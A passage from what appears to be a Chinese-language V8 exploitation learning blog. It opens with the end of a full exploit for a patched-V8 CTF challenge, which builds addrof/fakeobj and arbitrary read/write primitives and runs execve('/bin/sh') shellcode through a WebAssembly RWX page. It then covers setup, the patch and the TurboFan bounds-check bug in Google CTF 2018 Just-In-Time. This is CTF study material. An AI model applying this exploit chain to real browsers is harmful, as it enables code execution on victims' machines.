class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ GC / state ------------------ */</span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">let helper = new Helpers()</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">let obj = &#123;&#125;</span><br><span class="line">let obj_list = [obj];</span><br><span class="line">let float_list = [4.3];</span><br><span class="line"> </span><br><span class="line">let obj_list_map = obj_list.oob()</span><br><span class="line">let float_list_map = float_list.oob()</span><br><span class="line"></span><br><span class="line">function get_addr(obj)&#123;</span><br><span class="line">  obj_list[0] = obj</span><br><span class="line">  obj_list.oob(float_list_map)</span><br><span class="line">  let res =  helper.f64toi64(obj_list[0]) - 1n</span><br><span class="line">  obj_list.oob(obj_list_map)</span><br><span class="line">  return res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_obj(addr)&#123;</span><br><span class="line">  float_list[0] = helper.i64tof64(addr | 1n)</span><br><span class="line">  float_list.oob(obj_list_map)</span><br><span class="line">  let res = float_list[0]</span><br><span class="line">  float_list.oob(float_list_map)</span><br><span class="line">  return res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let evil_float_array = [</span><br><span class="line">  float_list_map,                               //map</span><br><span class="line">  helper.i64tof64(0n),                         //properties</span><br><span class="line">  helper.i64tof64(0xdeadbeefn),               //elements*</span><br><span class="line">  helper.i64tof64((0x80n &lt;&lt; 32n) | 0n),      //lenth</span><br><span class="line">  helper.i64tof64(0xdeadbeefn),</span><br><span class="line">  helper.i64tof64(0xdeadbeefn),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">let evil_float_array_addr = get_addr(evil_float_array)</span><br><span class="line">let evil_float_array_elements_addr = evil_float_array_addr + 0x30n</span><br><span class="line">let fake_obj = get_obj(evil_float_array_elements_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function arb_write(addr,data)&#123;</span><br><span class="line">  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n) //set fake_obj elements*</span><br><span class="line">  fake_obj[0] = helper.i64tof64(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arb_read(addr) &#123;</span><br><span class="line">  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n) //set fake_obj elements*</span><br><span class="line">  return helper.f64toi64(fake_obj[0])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let data_buf = new ArrayBuffer(0x1000)</span><br><span class="line">let data_view = new DataView(data_buf)</span><br><span class="line">let backing_store_addr = get_addr(data_buf) + 0x20n</span><br><span class="line"></span><br><span class="line">let wasm_code = new Uint8Array([</span><br><span class="line">  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0,</span><br><span class="line">  1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128,</span><br><span class="line">  128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105,</span><br><span class="line">  110, 0, 0, 10, 142, 128, 128, 128, 0, 1, 136, 128, 128, 128, 0, 0, 65, 239, 253, 182, 245, 125,</span><br><span class="line">  11,</span><br><span class="line">])</span><br><span class="line">let wasm_module = new WebAssembly.Module(wasm_code)</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_module)</span><br><span class="line">let shell = wasm_instance.exports.main</span><br><span class="line">let wasm_instance_addr = get_addr(wasm_instance)</span><br><span class="line">let rwx_addr = arb_read(wasm_instance_addr + 0x88n)</span><br><span class="line"></span><br><span class="line">let shellcode = [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">arb_write(backing_store_addr,rwx_addr)</span><br><span class="line"></span><br><span class="line">for (let i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">  data_view.setBigInt64(i * 8, shellcode[i], true)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>



<h3 id="Google-CTF-2018-Just-In-Time"><a href="#Google-CTF-2018-Just-In-Time" class="headerlink" title="Google CTF 2018 Just-In-Time"></a>Google CTF 2018 Just-In-Time</h3><p>这是一道关于Turbon Fan优化的漏洞利用</p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard e0a58f83255d1dae907e2ba4564ad8928a7dedf4</span><br><span class="line">gclient sync</span><br><span class="line">git apply &lt; ./diff</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure>

<p>下面是patch文件，如果报错可能是windows复制的，换行符转成linux的就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/BUILD.gn b/BUILD.gn</span><br><span class="line">index c6a58776cd..14c56d2910 100644</span><br><span class="line">--- a/BUILD.gn</span><br><span class="line">+++ b/BUILD.gn</span><br><span class="line">@@ -1699,6 +1699,8 @@ v8_source_set(&quot;v8_base&quot;) &#123;</span><br><span class="line">     &quot;src/compiler/dead-code-elimination.cc&quot;,</span><br><span class="line">     &quot;src/compiler/dead-code-elimination.h&quot;,</span><br><span class="line">     &quot;src/compiler/diamond.h&quot;,</span><br><span class="line">+    &quot;src/compiler/duplicate-addition-reducer.cc&quot;,</span><br><span class="line">+    &quot;src/compiler/duplicate-addition-reducer.h&quot;,</span><br><span class="line">     &quot;src/compiler/effect-control-linearizer.cc&quot;,</span><br><span class="line">     &quot;src/compiler/effect-control-linearizer.h&quot;,</span><br><span class="line">     &quot;src/compiler/escape-analysis-reducer.cc&quot;,</span><br><span class="line">diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000000..59e8437f3d</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line">@@ -0,0 +1,71 @@</span><br><span class="line">+// Copyright 2018 Google LLC</span><br><span class="line">+//</span><br><span class="line">+// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line">+// you may not use this file except in compliance with the License.</span><br><span class="line">+// You may obtain a copy of the License at</span><br><span class="line">+//</span><br><span class="line">+//      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">+//</span><br><span class="line">+// Unless required by applicable law or agreed to in writing, software</span><br><span class="line">+// distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">+// See the License for the specific language governing permissions and</span><br><span class="line">+// limitations under the License.</span><br><span class="line">+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;</span><br><span class="line">+</span><br><span class="line">+#include &quot;src/compiler/common-operator.h&quot;</span><br><span class="line">+#include &quot;src/compiler/graph.h&quot;</span><br><span class="line">+#include &quot;src/compiler/node-properties.h&quot;</span><br><span class="line">+</span><br><span class="line">+namespace v8 &#123;</span><br><span class="line">+namespace internal &#123;</span><br><span class="line">+namespace compiler &#123;</span><br><span class="line">+</span><br><span class="line">+DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph,</span><br><span class="line">+                     CommonOperatorBuilder* common)</span><br><span class="line">+    : AdvancedReducer(editor),</span><br><span class="line">+      graph_(graph), common_(common) &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+Reduction DuplicateAdditionReducer::Reduce(Node* node) &#123;</span><br><span class="line">+  switch (node-&gt;opcode()) &#123;</span><br><span class="line">+    case IrOpcode::kNumberAdd:</span><br><span class="line">+      return ReduceAddition(node);</span><br><span class="line">+    default:</span><br><span class="line">+      return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) &#123;</span><br><span class="line">+  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0);</span><br><span class="line">+  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0);</span><br><span class="line">+  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2);</span><br><span class="line">+</span><br><span class="line">+  Node* left = NodeProperties::GetValueInput(node, 0);</span><br><span class="line">+  if (left-&gt;opcode() != node-&gt;opcode()) &#123;</span><br><span class="line">+    return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* right = NodeProperties::GetValueInput(node, 1);</span><br><span class="line">+  if (right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* parent_left = NodeProperties::GetValueInput(left, 0);</span><br><span class="line">+  Node* parent_right = NodeProperties::GetValueInput(left, 1);</span><br><span class="line">+  if (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  double const1 = OpParameter&lt;double&gt;(right-&gt;op());</span><br><span class="line">+  double const2 = OpParameter&lt;double&gt;(parent_right-&gt;op());</span><br><span class="line">+  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));</span><br><span class="line">+</span><br><span class="line">+  NodeProperties::ReplaceValueInput(node, parent_left, 0);</span><br><span class="line">+  NodeProperties::ReplaceValueInput(node, new_const, 1);</span><br><span class="line">+</span><br><span class="line">+  return Changed(node);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+&#125;  // namespace compiler</span><br><span class="line">+&#125;  // namespace internal</span><br><span class="line">+&#125;  // namespace v8</span><br><span class="line">diff --git a/src/compiler/duplicate-addition-reducer.h b/src/compiler/duplicate-addition-reducer.h</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000000..7285f1ae3e</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/compiler/duplicate-addition-reducer.h</span><br><span class="line">@@ -0,0 +1,60 @@</span><br><span class="line">+/*</span><br><span class="line">+ * Copyright 2018 Google LLC</span><br><span class="line">+ *</span><br><span class="line">+ * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line">+ * you may not use this file except in compliance with the License.</span><br><span class="line">+ * You may obtain a copy of the License at</span><br><span class="line">+ *</span><br><span class="line">+ *      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">+ *</span><br><span class="line">+ * Unless required by applicable law or agreed to in writing, software</span><br><span class="line">+ * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">+ * See the License for the specific language governing permissions and</span><br><span class="line">+ * limitations under the License.</span><br><span class="line">+ */</span><br><span class="line">+</span><br><span class="line">+#ifndef V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span><br><span class="line">+#define V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span><br><span class="line">+</span><br><span class="line">+#include &quot;src/base/compiler-specific.h&quot;</span><br><span class="line">+#include &quot;src/compiler/graph-reducer.h&quot;</span><br><span class="line">+#include &quot;src/globals.h&quot;</span><br><span class="line">+#include &quot;src/machine-type.h&quot;</span><br><span class="line">+</span><br><span class="line">+namespace v8 &#123;</span><br><span class="line">+namespace internal &#123;</span><br><span class="line">+namespace compiler &#123;</span><br><span class="line">+</span><br><span class="line">+// Forward declarations.</span><br><span class="line">+class CommonOperatorBuilder;</span><br><span class="line">+class Graph;</span><br><span class="line">+</span><br><span class="line">+class V8_EXPORT_PRIVATE DuplicateAdditionReducer final</span><br><span class="line">+    : public NON_EXPORTED_BASE(AdvancedReducer) &#123;</span><br><span class="line">+ public:</span><br><span class="line">+  DuplicateAdditionReducer(Editor* editor, Graph* graph,</span><br><span class="line">+                      CommonOperatorBuilder* common);</span><br><span class="line">+  ~DuplicateAdditionReducer() final &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+  const char* reducer_name() const override &#123; return &quot;DuplicateAdditionReducer&quot;; &#125;</span><br><span class="line">+</span><br><span class="line">+  Reduction Reduce(Node* node) final;</span><br><span class="line">+</span><br><span class="line">+ private:</span><br><span class="line">+  Reduction ReduceAddition(Node* node);</span><br><span class="line">+</span><br><span class="line">+  Graph* graph() const &#123; return graph_;&#125;</span><br><span class="line">+  CommonOperatorBuilder* common() const &#123; return common_; &#125;;</span><br><span class="line">+</span><br><span class="line">+  Graph* const graph_;</span><br><span class="line">+  CommonOperatorBuilder* const common_;</span><br><span class="line">+</span><br><span class="line">+  DISALLOW_COPY_AND_ASSIGN(DuplicateAdditionReducer);</span><br><span class="line">+&#125;;</span><br><span class="line">+</span><br><span class="line">+&#125;  // namespace compiler</span><br><span class="line">+&#125;  // namespace internal</span><br><span class="line">+&#125;  // namespace v8</span><br><span class="line">+</span><br><span class="line">+#endif  // V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span><br><span class="line">diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.cc</span><br><span class="line">index 5717c70348..8cca161ad5 100644</span><br><span class="line">--- a/src/compiler/pipeline.cc</span><br><span class="line">+++ b/src/compiler/pipeline.cc</span><br><span class="line">@@ -27,6 +27,7 @@</span><br><span class="line"> #include &quot;src/compiler/constant-folding-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/control-flow-optimizer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/dead-code-elimination.h&quot;</span><br><span class="line">+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/effect-control-linearizer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/escape-analysis-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/escape-analysis.h&quot;</span><br><span class="line">@@ -1301,6 +1302,8 @@ struct TypedLoweringPhase &#123;</span><br><span class="line">                                data-&gt;jsgraph()-&gt;Dead());</span><br><span class="line">     DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">                                               data-&gt;common(), temp_zone);</span><br><span class="line">+    DuplicateAdditionReducer duplicate_addition_reducer(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">+                                              data-&gt;common());</span><br><span class="line">     JSCreateLowering create_lowering(&amp;graph_reducer, data-&gt;dependencies(),</span><br><span class="line">                                      data-&gt;jsgraph(), data-&gt;js_heap_broker(),</span><br><span class="line">                                      data-&gt;native_context(), temp_zone);</span><br><span class="line">@@ -1318,6 +1321,7 @@ struct TypedLoweringPhase &#123;</span><br><span class="line">                                          data-&gt;js_heap_broker(), data-&gt;common(),</span><br><span class="line">                                          data-&gt;machine(), temp_zone);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);</span><br><span class="line">+    AddReducer(data, &amp;graph_reducer, &amp;duplicate_addition_reducer);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;create_lowering);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;constant_folding_reducer);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;typed_optimization);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>patch在turboFan中的<code>TypedLoweringPhase</code>阶段添加了一种优化方式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Reduction DuplicateAdditionReducer::Reduce(Node* node) &#123;</span><br><span class="line">  switch (node-&gt;opcode()) &#123;</span><br><span class="line">    case IrOpcode::kNumberAdd:</span><br><span class="line">      return ReduceAddition(node);</span><br><span class="line">    default:</span><br><span class="line">      return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) &#123;</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0);</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0);</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2);</span><br><span class="line"></span><br><span class="line">  Node* left = NodeProperties::GetValueInput(node, 0);</span><br><span class="line">  if (left-&gt;opcode() != node-&gt;opcode()) &#123;</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Node* right = NodeProperties::GetValueInput(node, 1);</span><br><span class="line">  if (right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Node* parent_left = NodeProperties::GetValueInput(left, 0);</span><br><span class="line">  Node* parent_right = NodeProperties::GetValueInput(left, 1);</span><br><span class="line">  if (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  double const1 = OpParameter&lt;double&gt;(right-&gt;op());</span><br><span class="line">  double const2 = OpParameter&lt;double&gt;(parent_right-&gt;op());</span><br><span class="line">  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));</span><br><span class="line"></span><br><span class="line">  NodeProperties::ReplaceValueInput(node, parent_left, 0);</span><br><span class="line">  NodeProperties::ReplaceValueInput(node, new_const, 1);</span><br><span class="line"></span><br><span class="line">  return Changed(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种优化把x+1+1优化成了x+2，看似不影响，但计算机不是数学，他们的底层不一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x+1+1应该是</span><br><span class="line">tmp = x+1</span><br><span class="line">tmp + 1</span><br><span class="line">x+2直接就是x+2</span><br></pre></td></tr></table></figure>

<p>而根据浮点数的IEEE764标准 当一个浮点数越来越大时，有限的空间只能保留高位的数据，因此一旦浮点数的值超过某个界限时，低位数值将被舍弃，此时数值不能全部表示，存在精度丢失，下面拿python的来举例</p>
<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204044422366.png" alt="image-20251204044422366"></p>
<p>可以看到x+2可以被表示，但x+1不能被表示出来，而checkBounds检测数组越界会在TurboFan的SimplifiedLoweringPhase阶段根据索引和数组的范围被优化，如果索引最大值小于lenth的最小值checkBounds检测将会被优化掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// Dispatching routine for visiting the node &#123;node&#125; with the usage &#123;use&#125;.</span><br><span class="line">  // Depending on the operator, propagate new usage info to the inputs.</span><br><span class="line">  void VisitNode(Node* node, Truncation truncation,</span><br><span class="line">                SimplifiedLowering* lowering) &#123;</span><br><span class="line">    // Unconditionally eliminate unused pure nodes (only relevant if there&#x27;s</span><br><span class="line">    // a pure operation in between two effectful ones, where the last one</span><br><span class="line">    // is unused).</span><br><span class="line">    // Note: We must not do this for constants, as they are cached and we</span><br><span class="line">    // would thus kill the cached &#123;node&#125; during lowering (i.e. replace all</span><br><span class="line">    // uses with Dead), but at that point some node lowering might have</span><br><span class="line">    // already taken the constant &#123;node&#125; from the cache (while it was in</span><br><span class="line">    // a sane state still) and we would afterwards replace that use with</span><br><span class="line">    // Dead as well.</span><br><span class="line">    if (node-&gt;op()-&gt;ValueInputCount() &gt; 0 &amp;&amp;</span><br><span class="line">        node-&gt;op()-&gt;HasProperty(Operator::kPure)) &#123;</span><br><span class="line">      if (truncation.IsUnused()) return VisitUnused(node);</span><br><span class="line">    &#125;</span><br><span class="line">    switch (node-&gt;opcode()) &#123;</span><br><span class="line">      // ...</span><br><span class="line">        case IrOpcode::kCheckBounds: &#123;</span><br><span class="line">            const CheckParameters&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">            Type index_type = TypeOf(node-&gt;InputAt(0));</span><br><span class="line">            Type length_type = TypeOf(node-&gt;InputAt(1));</span><br><span class="line">            if (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">              // Map -0 to 0, and the values in the [-2^31,-1] range to the</span><br><span class="line">              // [2^31,2^32-1] range, which will be considered out-of-bounds</span><br><span class="line">              // as well, because the &#123;length_type&#125; is limited to Unsigned31.</span><br><span class="line">              VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                        MachineRepresentation::kWord32);</span><br><span class="line">              if (lower() &amp;&amp; lowering-&gt;poisoning_level_ ==</span><br><span class="line">                                PoisoningMitigationLevel::kDontPoison) &#123;</span><br><span class="line">                // 可以看到，如果当前索引的最大值小于length的最小值，则表示当前索引的使用没有越界</span><br><span class="line">                if (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">                    (index_type.Min() &gt;= 0.0 &amp;&amp;</span><br><span class="line">                    index_type.Max() &lt; length_type.Min())) &#123;</span><br><span class="line">                  // The bounds check is redundant if we already know that</span><br><span class="line">                  // the index is within the bounds of [0.0, length[.</span><br><span class="line">                  // CheckBound将会被优化</span><br><span class="line">                  DeferReplacement(node, node-&gt;InputAt(0));</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              VisitBinop(</span><br><span class="line">                  node,</span><br><span class="line">                  UseInfo::CheckedSigned32AsWord32(kIdentifyZeros, p.feedback()),</span><br><span class="line">                  UseInfo::TruncatingWord32(), MachineRepresentation::kWord32);</span><br><span class="line">            &#125;</span><br><span class="line">            return;</span><br><span class="line">          &#125;</span><br><span class="line">    // ....</span><br><span class="line">    &#125;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>下面用一个poc来演示一下</p>
